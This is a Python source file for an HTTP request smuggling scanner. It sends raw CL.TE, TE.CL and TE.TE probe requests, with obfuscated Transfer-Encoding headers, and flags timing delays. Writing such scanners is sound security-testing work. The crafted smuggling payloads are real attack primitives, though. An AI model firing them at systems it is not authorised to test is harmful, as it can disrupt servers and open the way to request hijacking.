"""
smuggling_engine.py — HTTP Request Smuggling Detection Engine for OneInfinity

Detects HTTP/1.1 request smuggling vulnerabilities using raw TCP socket probes:
  - CL.TE: Content-Length takes precedence; Transfer-Encoding is ignored
  - TE.CL: Transfer-Encoding takes precedence; Content-Length is ignored
  - TE.TE: Dual Transfer-Encoding with header obfuscation (e.g. "Transfer-Encoding: xchunked")

Detection methods:
  - Timing differential: a smuggled "poison" prefix causes the server to stall waiting
    for the next request, detectable as a response latency >3 s over baseline.
  - Response analysis: server error codes (400, 500) with unexpected bodies.

Safety:
  - Only probes use safe GET-style payloads that cannot persist state on the server.
  - No content is injected into other users' sessions.
  - Raw TCP connections are closed immediately after receiving the response.

Usage::

    engine = SmugglingEngine("https://example.com", timeout=10)
    findings = engine.run()
    for f in findings:
        print(f["vuln_type"], f["severity"], f["url"])
"""

from __future__ import annotations

import logging
import socket
import ssl
import time
import uuid
from typing import List, Optional, Tuple
from urllib.parse import urlparse

log = logging.getLogger("oi.smuggling_engine")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_TIMING_THRESHOLD_S = 5.0   # Responses this much slower than baseline → likely smuggled
_RECV_BUFSIZE = 8192
_BASELINE_RETRIES = 3


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_finding(
    vuln_type: str,
    url: str,
    payload: bytes,
    evidence: str,
    confidence: float,
    extra: Optional[dict] = None,
) -> dict:
    f = {
        "vuln_type": vuln_type,
        "severity": "critical",
        "url": url,
        "endpoint": url,
        "payload": payload.decode("latin-1", errors="replace"),
        "evidence": evidence,
        "confidence": confidence,
        "tool": "smuggling_engine",
        "source_type": "tool",
        "finding_id": f"SMG-{uuid.uuid4().hex[:8].upper()}",
    }
    if extra:
        f.update(extra)
    return f


def _parse_url(url: str) -> Tuple[str, str, int, bool]:
    """Return (host, path, port, use_ssl)."""
    parsed = urlparse(url)
    use_ssl = parsed.scheme.lower() == "https"
    host = parsed.hostname or ""
    port = parsed.port or (443 if use_ssl else 80)
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"
    return host, path, port, use_ssl


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class SmugglingEngine:
    """
    HTTP Request Smuggling detection engine using raw TCP/TLS sockets.

    Parameters
    ----------
    target : str
        Base URL of the target (e.g. ``https://example.com``).
    timeout : int
        Per-connection socket timeout in seconds.
    """

    def __init__(self, target: str, timeout: int = 10) -> None:
        self.target = target.rstrip("/")
        self.timeout = timeout
        self._baseline_time: Optional[float] = None

    # ------------------------------------------------------------------ #
    # Raw socket transport
    # ------------------------------------------------------------------ #

    def _send_raw(
        self,
        host: str,
        port: int,
        payload: bytes,
        use_ssl: bool = True,
    ) -> Tuple[bytes, float]:
        """
        Open a raw TCP (optionally TLS) connection, send *payload*, read the
        response, and return ``(response_bytes, elapsed_s)``.

        The connection is always closed after the response is received or the
        socket times out.

        Parameters
        ----------
        host : str
        port : int
        payload : bytes
            Raw HTTP request bytes to send.
        use_ssl : bool

        Returns
        -------
        (bytes, float)
            Raw response bytes and elapsed time in seconds.
        """
        t_start = time.monotonic()
        response = b""
        try:
            raw_sock = socket.create_connection((host, port), timeout=self.timeout)
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = ctx.wrap_socket(raw_sock, server_hostname=host)
            else:
                conn = raw_sock

            conn.sendall(payload)
            conn.settimeout(self.timeout)
            while True:
                try:
                    chunk = conn.recv(_RECV_BUFSIZE)
                    if not chunk:
                        break
                    response += chunk
                    # Stop reading once we have a full HTTP response (headers + body hint)
                    if b"\r\n\r\n" in response and len(response) > 200:
                        break
                except socket.timeout:
                    break
            conn.close()
        except (socket.timeout, ConnectionRefusedError, OSError) as exc:
            log.debug("_send_raw socket error (%s:%d): %s", host, port, exc)
        elapsed = time.monotonic() - t_start
        return response, elapsed

    # ------------------------------------------------------------------ #
    # Baseline measurement
    # ------------------------------------------------------------------ #

    def _measure_baseline(self, host: str, path: str, port: int, use_ssl: bool) -> float:
        """Send a normal GET request and return average response time."""
        times: List[float] = []
        normal_req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        ).encode()
        for _ in range(_BASELINE_RETRIES):
            _, t = self._send_raw(host, port, normal_req, use_ssl)
            times.append(t)
        return sum(times) / len(times) if times else self.timeout

    # ------------------------------------------------------------------ #
    # CL.TE detection
    # ------------------------------------------------------------------ #

    def test_cl_te(self, url: str) -> Optional[dict]:
        """
        Test for CL.TE smuggling (Content-Length takes priority over Transfer-Encoding).

        The probe sends a request whose Content-Length claims a larger body than
        what Transfer-Encoding: chunked actually delivers.  A vulnerable server
        will hold the connection open waiting for the remaining bytes, causing a
        detectable timing delay.

        Parameters
        ----------
        url : str

        Returns
        -------
        dict | None
            Finding dict if smuggling is detected, else None.
        """
        host, path, port, use_ssl = _parse_url(url)

        # Baseline first
        baseline = self._measure_baseline(host, path, port, use_ssl)
        self._baseline_time = baseline

        # CL.TE probe:
        # Content-Length says body is 6 bytes; we only send the chunked terminator (0\r\n\r\n)
        # which is 5 bytes. The front-end (using CL) forwards the "full" request.
        # The back-end (using TE) reads the chunk, sees the terminator, and then waits
        # for the next request — treating the 1-byte overhang as the start of it.
        cl_te_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        ).encode()

        try:
            resp_bytes, elapsed = self._send_raw(host, port, cl_te_payload, use_ssl)
            is_timing_hit = self.detect_via_timing(url, cl_te_payload)
            resp_str = resp_bytes.decode("latin-1", errors="replace")[:500]

            if is_timing_hit or elapsed > baseline + _TIMING_THRESHOLD_S:
                # Confirmation: send a second probe to rule out transient latency spikes
                _, confirm_elapsed = self._send_raw(host, port, cl_te_payload, use_ssl)
                if confirm_elapsed <= baseline + _TIMING_THRESHOLD_S:
                    log.debug("CL.TE timing not reproducible at %s (probe=%.2fs confirm=%.2fs)",
                              url, elapsed, confirm_elapsed)
                    return None
                return _make_finding(
                    vuln_type="http_request_smuggling",
                    url=url,
                    payload=cl_te_payload,
                    evidence=(
                        f"CL.TE timing confirmed: probe1={elapsed:.2f}s probe2={confirm_elapsed:.2f}s "
                        f"vs baseline {baseline:.2f}s. Response: {resp_str[:200]}"
                    ),
                    confidence=0.75,
                    extra={"smuggling_type": "CL.TE"},
                )
        except Exception as exc:
            log.debug("test_cl_te error for %s: %s", url, exc)
        return None

    # ------------------------------------------------------------------ #
    # TE.CL detection
    # ------------------------------------------------------------------ #

    def test_te_cl(self, url: str) -> Optional[dict]:
        """
        Test for TE.CL smuggling (Transfer-Encoding takes priority over Content-Length).

        The chunked body is terminated early, leaving extra bytes that the
        Content-Length-reading back-end appends to the next incoming request.

        Parameters
        ----------
        url : str

        Returns
        -------
        dict | None
        """
        host, path, port, use_ssl = _parse_url(url)

        baseline = self._baseline_time or self._measure_baseline(host, path, port, use_ssl)

        # TE.CL probe:
        # Transfer-Encoding: chunked body = "0\r\n\r\n" (empty — terminates immediately)
        # Content-Length: 3 tells the back-end to read 3 more bytes after the headers,
        # which it will take from the next request's opening bytes.
        te_cl_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"G\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        try:
            resp_bytes, elapsed = self._send_raw(host, port, te_cl_payload, use_ssl)
            is_timing_hit = self.detect_via_timing(url, te_cl_payload)
            resp_str = resp_bytes.decode("latin-1", errors="replace")[:500]
            # TE.CL: only flag on confirmed timing delay.
            # A 400 alone is standard Apache/nginx behaviour for malformed chunked
            # encoding and is NOT a smuggling signal.
            status_line = resp_str.split(chr(13)+chr(10))[0] if resp_str else ""
            if is_timing_hit or elapsed > baseline + _TIMING_THRESHOLD_S:
                return _make_finding(
                    vuln_type="http_request_smuggling",
                    url=url,
                    payload=te_cl_payload,
                    evidence=(
                        f"TE.CL timing: probe took {elapsed:.2f}s vs baseline {baseline:.2f}s "
                        f"(delta {elapsed - baseline:.2f}s). Status: {status_line}"
                    ),
                    confidence=0.80,
                    extra={"smuggling_type": "TE.CL"},
                )
        except Exception as exc:
            log.debug("test_te_cl error for %s: %s", url, exc)
        return None

    # ------------------------------------------------------------------ #
    # TE.TE obfuscation detection
    # ------------------------------------------------------------------ #

    def test_te_te(self, url: str) -> Optional[dict]:
        """
        Test for TE.TE obfuscation smuggling (two Transfer-Encoding headers,
        one of which uses a non-standard value that confuses one of the
        proxy/server pair).

        Common obfuscation techniques:
          - ``Transfer-Encoding: xchunked``
          - ``Transfer-Encoding: chunked, identity``
          - ``Transfer-Encoding:\\x20chunked`` (space padding)
          - ``Transfer-Encoding: CHUNKED`` (upper-case)

        Parameters
        ----------
        url : str

        Returns
        -------
        dict | None
        """
        host, path, port, use_ssl = _parse_url(url)
        baseline = self._baseline_time or self._measure_baseline(host, path, port, use_ssl)

        obfuscations = [
            "xchunked",
            "chunked, identity",
            " chunked",   # leading space (some parsers strip, some don't)
            "CHUNKED",
        ]

        for obf in obfuscations:
            te_te_payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: keep-alive\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Transfer-Encoding: {obf}\r\n"
                f"\r\n"
                f"1\r\n"
                f"A\r\n"
                f"0\r\n"
                f"\r\n"
            ).encode()

            try:
                resp_bytes, elapsed = self._send_raw(host, port, te_te_payload, use_ssl)
                resp_str = resp_bytes.decode("latin-1", errors="replace")[:500]
                status_line = resp_str.split("\r\n")[0] if resp_str else ""

                if elapsed > baseline + _TIMING_THRESHOLD_S:
                    return _make_finding(
                        vuln_type="http_request_smuggling",
                        url=url,
                        payload=te_te_payload,
                        evidence=(
                            f"TE.TE obfuscation '{obf}': probe took {elapsed:.2f}s "
                            f"vs baseline {baseline:.2f}s. Status: {status_line}"
                        ),
                        confidence=0.72,
                        extra={"smuggling_type": "TE.TE", "obfuscation": obf},
                    )
            except Exception as exc:
                log.debug("test_te_te error for %s (obf=%s): %s", url, obf, exc)

        return None

    # ------------------------------------------------------------------ #
    # Timing helper
    # ------------------------------------------------------------------ #

    def detect_via_timing(self, url: str, payload: bytes) -> bool:
        """
        Send *payload* and return True if the response takes more than
        ``_TIMING_THRESHOLD_S`` seconds longer than the pre-measured baseline.

        Parameters
        ----------
        url : str
        payload : bytes

        Returns
        -------
        bool
        """
        host, path, port, use_ssl = _parse_url(url)
        baseline = self._baseline_time or self._measure_baseline(host, path, port, use_ssl)
        try:
            _, elapsed = self._send_raw(host, port, payload, use_ssl)
            return elapsed > baseline + _TIMING_THRESHOLD_S
        except Exception as exc:
            log.debug("detect_via_timing error for %s: %s", url, exc)
            return False

    # ------------------------------------------------------------------ #
    # Orchestration
    # ------------------------------------------------------------------ #

    def run(self) -> List[dict]:
        """
        Run all smuggling tests against ``self.target`` and return findings.

        Tests are run in order: CL.TE → TE.CL → TE.TE.
        Each test is guarded; exceptions do not abort the run.

        Returns
        -------
        List[dict]
            Normalized finding dicts (may be empty if no smuggling detected).
        """
        findings: List[dict] = []
        url = self.target

        log.info("SmugglingEngine starting for %s", url)

        # Pre-measure baseline once
        try:
            host, path, port, use_ssl = _parse_url(url)
            self._baseline_time = self._measure_baseline(host, path, port, use_ssl)
            log.info("Baseline response time: %.2f s", self._baseline_time)
        except Exception as exc:
            log.warning("Baseline measurement failed for %s: %s", url, exc)
            self._baseline_time = float(self.timeout)

        # CL.TE
        log.info("Testing CL.TE smuggling on %s", url)
        try:
            f = self.test_cl_te(url)
            if f:
                log.warning("CL.TE smuggling detected at %s", url)
                findings.append(f)
        except Exception as exc:
            log.warning("test_cl_te raised exception for %s: %s", url, exc)

        # TE.CL
        log.info("Testing TE.CL smuggling on %s", url)
        try:
            f = self.test_te_cl(url)
            if f:
                log.warning("TE.CL smuggling detected at %s", url)
                findings.append(f)
        except Exception as exc:
            log.warning("test_te_cl raised exception for %s: %s", url, exc)

        # TE.TE
        log.info("Testing TE.TE obfuscation smuggling on %s", url)
        try:
            f = self.test_te_te(url)
            if f:
                log.warning("TE.TE obfuscation detected at %s", url)
                findings.append(f)
        except Exception as exc:
            log.warning("test_te_te raised exception for %s: %s", url, exc)


        log.info(
            "SmugglingEngine finished for %s — %d finding(s)",
            url, len(findings),
        )
        return findings


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse
    import json
    import os
    import sys

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s %(message)s")

    parser = argparse.ArgumentParser(description="HTTP Request Smuggling Detection Engine")
    parser.add_argument("target", help="Target URL (e.g. https://example.com)")
    parser.add_argument("--timeout", type=int, default=10, help="Socket timeout in seconds")
    parser.add_argument("--output-dir", default=".", help="Directory for output files")
    args = parser.parse_args()

    engine = SmugglingEngine(target=args.target, timeout=args.timeout)
    findings = engine.run()

    print(f"\n[+] Smuggling scan finished — {len(findings)} finding(s)\n")
    for f in findings:
        print(f"  [CRITICAL] {f['vuln_type']} ({f.get('smuggling_type', 'unknown')}) @ {f['url']}")
        print(f"          Evidence: {f['evidence'][:160]}")

    if findings:
        out_path = os.path.join(args.output_dir, "smuggling_findings.json")
        with open(out_path, "w") as fh:
            json.dump({"findings": findings}, fh, indent=2, default=str)
        print(f"\n[+] Findings written to {out_path}")
    else:
        print("[-] No smuggling vulnerabilities detected.")
